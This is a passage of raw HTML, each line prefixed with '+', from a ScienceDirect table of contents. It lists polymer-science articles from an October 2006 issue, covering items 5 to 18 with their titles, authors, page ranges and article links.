+Eduard A. Stefanescu, Patrick J. Schexnailder, Avinash Dundigalla, Ioan I. Negulescu and Gudrun Schmidt<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXPSK-3&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=4&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=7ffb7145eaed3b0005381ab6ec7caa8c">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXPSK-3&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=4&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=78d65c08e5be7295cbd53d10afcc45be">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KVXPSK-3-R&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=d8605fabc6590af71599a26d46eb2199&ie=/sdarticle.pdf">PDF (1096 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>5.&nbsp;<input type=checkbox name = art value="B6TXW-4KV3XYV-2:5"></td><td width=95% align=left colspan=2><b>
+
+
+
+Greener method for high-quality polypyrrole</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7349-7354</nobr> </i><br>
+
+
+H.V. Rasika Dias, Mauro Fianchini and R.M. Gamini Rajapakse<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV3XYV-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=5&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=d37c928212a6f5ccb4b455efe112c61d">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV3XYV-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=5&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=62b0dc0750dcebd55d5a8b42203c4876">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV3XYV-2-B&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=cef26ca81035534f86841ca6281c5431&ie=/sdarticle.pdf">PDF (240 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>6.&nbsp;<input type=checkbox name = art value="B6TXW-4KV2Y7P-2:6"></td><td width=95% align=left colspan=2><b>
+
+
+
+Microscale analysis of patterning reactions via FTIR imaging: Application to intelligent hydrogel systems</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7355-7360</nobr> </i><br>
+
+
+Dipti Biswal and J. Zach Hilt<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=6&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=b7c0dda89363626174ab9c3baeee3c23">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=6&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=32a9aaf47715da1e9a580f644bf40d65">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV2Y7P-2-P&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=d36079854f0d8560890a7efcd43432e0&ie=/sdarticle.pdf">PDF (577 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>7.&nbsp;<input type=checkbox name = art value="B6TXW-4KV8TH6-5:7"></td><td width=95% align=left colspan=2><b>
+
+
+
+Hybrid composites of conductive polyaniline and nanocrystalline titanium oxide prepared via self-assembling and graft polymerization</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7361-7367</nobr> </i><br>
+
+
+Jing Li, Lihua Zhu, Yinghui Wu, Yutaka Harima, Aiqing Zhang and Heqing Tang<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV8TH6-5&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=7&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=bb68eecf8118ec4ce0af953a488aee30">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV8TH6-5&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=7&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=1a5eea105612e15eefb78814b787f006">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV8TH6-5-H&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=3076338471d210bff68a3808616eb815&ie=/sdarticle.pdf">PDF (484 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>8.&nbsp;<input type=checkbox name = art value="B6TXW-4KVXHRX-2:8"></td><td width=95% align=left colspan=2><b>
+
+
+
+Double propagation based on diepoxide, a facile route to high molecular weight poly(propylene carbonate)</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7368-7373</nobr> </i><br>
+
+
+Youhua Tao, Xianhong Wang, Xiaojiang Zhao, Ji Li and Fosong Wang<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXHRX-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=8&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=78165176abbc18f4318994c96c166e1d">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXHRX-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=8&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=8b58ac2c1752c94925299d1214cc5d14">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KVXHRX-2-K&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=be9123b9e3b85c22d7a43f9bf07aee32&ie=/sdarticle.pdf">PDF (339 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>9.&nbsp;<input type=checkbox name = art value="B6TXW-4KVXPSK-4:9"></td><td width=95% align=left colspan=2><b>
+
+
+
+Poly(<span class="smCaps">l</span>-lactide) comb polymer brushes on the surface of clay layers</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7374-7381</nobr> </i><br>
+
+
+Yongfang Yang, Dongxia Wu, Chenxi Li, Li Liu, Xiaohui Cheng and Hanying Zhao<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXPSK-4&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=9&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=b59af66f6ef9202f502bc2e35fbc80fa">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXPSK-4&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=9&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=744fc51a15245ddda4636e790430a7fe">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KVXPSK-4-R&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=4e8a1067caed983444d6fce93bf6a163&ie=/sdarticle.pdf">PDF (363 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>10.&nbsp;<input type=checkbox name = art value="B6TXW-4KV8TH6-1:10"></td><td width=95% align=left colspan=2><b>
+
+
+
+Syntheses, characterization, and energy transfer properties of benzothiadiazole-based hyperbranched polyfluorenes</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7382-7390</nobr> </i><br>
+
+
+Zhun Ma, Su Lu, Qu-Li Fan, Chun-Yang Qing, Yan-Yan Wang, Pei Wang and Wei Huang<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV8TH6-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=10&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=bf81f5b22eb66561cb869176c91d4e5e">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV8TH6-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=10&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=9ec4472ee70fbd0c574cd5b21e61c7ca">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV8TH6-1-F&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=be4a1d6a2002060177d99f23d05cffa6&ie=/sdarticle.pdf">PDF (557 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>11.&nbsp;<input type=checkbox name = art value="B6TXW-4KW5WJ4-2:11"></td><td width=95% align=left colspan=2><b>
+
+
+
+Cylindrical polyelectrolyte-comb-surfactant complexes</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7391-7396</nobr> </i><br>
+
+
+Sabrina Duschner, Franziska Gr&#xf6;hn and Michael Maskos<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KW5WJ4-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=11&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=1b8911fdb23bd04bf37898ebe17dfdaa">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KW5WJ4-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=11&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=36ec25c3cbf55574b4e90ecb26ebcd14">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KW5WJ4-2-H&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=002bc3846c8b5862814abda4ee51a3f7&ie=/sdarticle.pdf">PDF (473 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>12.&nbsp;<input type=checkbox name = art value="B6TXW-4KV3XYV-1:12"></td><td width=95% align=left colspan=2><b>
+
+
+
+Fluorescence and molecular dynamics to study the intramolecular energy transfer in <i>N</i>-vinyl carbazole/styrene copolymers of different molar compositions</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7397-7405</nobr> </i><br>
+
+
+Nicol&#xe1;s Gatica, Gema Marcelo and Francisco Mendicuti<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV3XYV-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=12&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=1ad95e2385129de8ad73ce2b707b986a">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV3XYV-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=12&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=02eb339692feb4ada7a9434ec2d15a52">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV3XYV-1-1X&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=686b75780fa37d82e44441720ed07788&ie=/sdarticle.pdf">PDF (462 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>13.&nbsp;<input type=checkbox name = art value="B6TXW-4KV2Y7P-6:13"></td><td width=95% align=left colspan=2><b>
+
+
+
+In situ characterization of moisture sorption/desorption in thin polymer films using optical waveguide spectroscopy</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7406-7413</nobr> </i><br>
+
+
+Li-Qiang Chu, Hai-Quan Mao and Wolfgang Knoll<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-6&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=13&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=4dff335b2d61bfc8e2e958943a3c57ee">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-6&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=13&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=966dfa03b2320014a50bda8ca716aeab">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV2Y7P-6-19&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=05e20014291d8d4c92cbf201fba08364&ie=/sdarticle.pdf">PDF (496 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>14.&nbsp;<input type=checkbox name = art value="B6TXW-4KV2Y7P-4:14"></td><td width=95% align=left colspan=2><b>
+
+
+
+Dependence of relaxation processes in a low-density polyethylene with different crosslink densities investigated by fluorescence spectroscopy</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7414-7424</nobr> </i><br>
+
+
+Tatiana D. Martins, Josiane V. Gulmine, Leni Akcelrud, Richard G. Weiss and Teresa D.Z. Atvars<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-4&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=14&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=40e4ede143fdc5aeba3f24fb2ba8b0ad">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-4&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=14&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=c509dd24799a2fd53651da84b18e8275">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV2Y7P-4-H&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=0d4b241c9141bef8ab1c3295d851473d&ie=/sdarticle.pdf">PDF (355 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>15.&nbsp;<input type=checkbox name = art value="B6TXW-4KV2Y7P-3:15"></td><td width=95% align=left colspan=2><b>
+
+
+
+Counterion dependent crystallization kinetics in blends of&#xa0;a perfluorosulfonate ionomer with poly(vinylidene fluoride)</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7425-7435</nobr> </i><br>
+
+
+Eric P. Taylor, Forrest A. Landis, Kirt A. Page and Robert B. Moore<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-3&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=15&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=c851f30d9059d24088817653358b64f0">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-3&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=15&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=f079d1063a7e5c644903a0d6dda8c71c">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV2Y7P-3-P&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=84eaba32f0258a504bc12390a58bbd61&ie=/sdarticle.pdf">PDF (499 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>16.&nbsp;<input type=checkbox name = art value="B6TXW-4KTVP3M-1:16"></td><td width=95% align=left colspan=2><b>
+
+
+
+Induced transparency in polythiophene bearing azobenzene moieties</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7436-7440</nobr> </i><br>
+
+
+D.S. Correa, V.C. Gon&#xe7;alves, D.T. Balogh, C.R. Mendon&#xe7;a and L. De Boni<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KTVP3M-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=16&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=cc1c6b917643e6a31bdb4ac8edcf738f">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KTVP3M-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=16&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=586799c24ecd65482541fb8711ad4df2">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KTVP3M-1-R&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=d8e028ed017e4777476145a0ba49067c&ie=/sdarticle.pdf">PDF (258 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>17.&nbsp;<input type=checkbox name = art value="B6TXW-4KV8TH6-4:17"></td><td width=95% align=left colspan=2><b>
+
+
+
+Antimicrobial properties of copper plasma-modified polyethylene</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7441-7445</nobr> </i><br>
+
+
+Wei Zhang, Yi-He Zhang, Jun-Hui Ji, Jun Zhao, Qing Yan and Paul K. Chu<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV8TH6-4&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=17&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=8aab6dcd4e20aaafe91ea21932bc5599">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV8TH6-4&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=17&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=64ef1ce14e515a84bd781d00599c3a3c">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV8TH6-4-D&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=1550d1c34bc2335622a0e3acc3ffbe64&ie=/sdarticle.pdf">PDF (254 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>18.&nbsp;<input type=checkbox name = art value="B6TXW-4KV2Y7P-5:18"></td><td width=95% align=left colspan=2><b>
+
+
+
+Complicated nanopattern composed of crosswise aligned nanoribbons and its application for integrating anisotropically aligned polypyrrole nanoparticles</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7446-7454</nobr> </i><br>
+
+
+Penglei Chen, Peng Gao and Minghua Liu<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-5&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=18&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=ad22930382e51e6ca228c2e7a0bcaae3">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-5&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=18&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=6c15051356ee1097136491b54b25c26e">Full Text + 